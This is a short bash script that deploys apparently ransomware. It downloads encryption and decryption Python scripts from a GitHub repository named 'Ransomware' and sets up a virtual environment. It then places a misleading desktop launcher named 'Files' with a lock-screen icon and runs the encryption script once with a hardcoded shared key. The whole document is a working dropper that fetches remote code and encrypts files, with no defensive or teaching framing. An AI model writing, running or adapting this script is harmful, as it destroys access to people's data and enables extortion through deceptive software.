#!/bin/bash
set -euo pipefail

cd ~/Desktop || exit 1

# Download Python files
wget -q https://raw.githubusercontent.com/Google-design/Ransomware/main/encrypt_full.py
wget -q https://raw.githubusercontent.com/Google-design/Ransomware/main/decrypt_gui.py
wget -q https://raw.githubusercontent.com/Google-design/Ransomware/main/requirements.txt

# Create virtual environment if not exists
if [ ! -d venv ]; then
  python3 -m venv venv
fi

# Install dependencies
source venv/bin/activate
pip install --upgrade pip
pip install -r requirements.txt --prefer-binary
deactivate

# Create the desktop launcher for decryption
cat > decrypt.desktop <<'DESKTOP'
[Desktop Entry]
Name=Files
Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 decrypt_gui.py && deactivate"
Type=Application
Terminal=false
Icon=system-lock-screen
DESKTOP

chmod +x decrypt.desktop

# --- Run encryption once with a hardcoded shared key ---
export EDGE_SHARED_KEY="superlongrandomsecret123"

source venv/bin/activate
python3 encrypt_full.py
deactivate

unset EDGE_SHARED_KEY
echo "✅ Encryption done. Shared key unset."
